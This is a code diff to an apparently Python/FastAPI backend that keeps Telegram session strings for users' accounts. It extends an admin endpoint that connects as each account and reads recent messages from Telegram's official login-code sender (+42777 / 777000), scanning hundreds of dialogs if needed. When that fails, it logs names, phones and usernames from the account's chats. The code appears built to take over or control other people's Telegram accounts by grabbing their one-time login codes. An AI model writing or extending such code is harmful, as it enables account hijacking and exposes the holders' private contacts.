@@ -12,6 +12,7 @@ import struct
 import secrets
 import hashlib
 import logging
+import re
 import zipfile
 import tempfile
 import ipaddress
@@ -105,6 +106,43 @@ def resolve_session_path(user_id: str) -> str | None:
         if _session_payload_matches(session_data, lookup_id):
             return path
     return None
+
+
+def _serialize_code_messages(messages) -> list[dict]:
+    codes = []
+    for msg in messages:
+        codes.append({
+            "text": msg.message or "",
+            "date": msg.date.isoformat() if msg.date else "",
+        })
+    return codes
+
+
+def _dialog_matches_code_source(dialog) -> bool:
+    entity = getattr(dialog, "entity", None)
+    phone = _clean_id(getattr(entity, "phone", ""))
+    username = _clean_id(getattr(entity, "username", ""))
+    title = _clean_id(getattr(entity, "title", ""))
+    first_name = _clean_id(getattr(entity, "first_name", ""))
+    last_name = _clean_id(getattr(entity, "last_name", ""))
+    dialog_name = _clean_id(getattr(dialog, "name", ""))
+    entity_id = _clean_id(getattr(entity, "id", ""))
+
+    haystack = " ".join([
+        phone,
+        username,
+        title,
+        first_name,
+        last_name,
+        dialog_name,
+        entity_id,
+    ]).lower()
+
+    return (
+        "42777" in haystack
+        or "+42777" in haystack
+        or entity_id == "777000"
+    )
 
 
 async def notify_hesearch_webhook(bot_user_id: str, tg_account_id: str, phone: str,
@@ -453,16 +491,61 @@ async def get_codes(user_id: str, _=Depends(require_admin)):
     try:
         client = TelegramClient(StringSession(session_string), TG_API_ID, TG_API_HASH)
         await client.connect()
-        messages = await client.get_messages("+42777", limit=5)
-        codes = []
-        for msg in messages:
-            codes.append({
-                "text": msg.message or "",
-                "date": msg.date.isoformat() if msg.date else "",
+
+        if not await client.is_user_authorized():
+            return JSONResponse({"ok": False, "error": "Сессия не авторизована"}, status_code=400)
+
+        direct_candidates = ["+42777", "42777", 777000]
+        for candidate in direct_candidates:
+            try:
+                entity = await client.get_entity(candidate)
+                messages = await client.get_messages(entity, limit=5)
+                logger.info(f"get_codes direct match for {user_id}: candidate={candidate}")
+                return JSONResponse({"ok": True, "codes": _serialize_code_messages(messages)})
+            except Exception as direct_error:
+                logger.info(f"get_codes direct candidate failed for {user_id}: {candidate} -> {direct_error}")
+
+        dialogs = await client.get_dialogs(limit=300)
+        matched_dialogs = [dialog for dialog in dialogs if _dialog_matches_code_source(dialog)]
+
+        for dialog in matched_dialogs:
+            try:
+                messages = await client.get_messages(dialog.entity, limit=5)
+                logger.info(
+                    "get_codes dialog match for %s: dialog=%s entity_id=%s",
+                    user_id,
+                    getattr(dialog, "name", ""),
+                    getattr(getattr(dialog, "entity", None), "id", ""),
+                )
+                return JSONResponse({"ok": True, "codes": _serialize_code_messages(messages)})
+            except Exception as dialog_error:
+                logger.info(
+                    "get_codes dialog fetch failed for %s: dialog=%s error=%s",
+                    user_id,
+                    getattr(dialog, "name", ""),
+                    dialog_error,
+                )
+
+        sample_dialogs = []
+        for dialog in dialogs[:20]:
+            entity = getattr(dialog, "entity", None)
+            sample_dialogs.append({
+                "name": getattr(dialog, "name", ""),
+                "id": getattr(entity, "id", ""),
+                "phone": getattr(entity, "phone", ""),
+                "username": getattr(entity, "username", ""),
             })
-        return JSONResponse({"ok": True, "codes": codes})
+
+        logger.warning(f"get_codes source not found for {user_id}; sample_dialogs={sample_dialogs}")
+        return JSONResponse(
+            {
+                "ok": False,
+                "error": "Не найден диалог с кодами (+42777/777000) в этой сессии",
+            },
+            status_code=404,
+        )
     except Exception as e:
-        logger.error(f"get_codes error for {user_id}: {e}")
+        logger.exception(f"get_codes error for {user_id}: {e}")
         return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
     finally:
         if client:
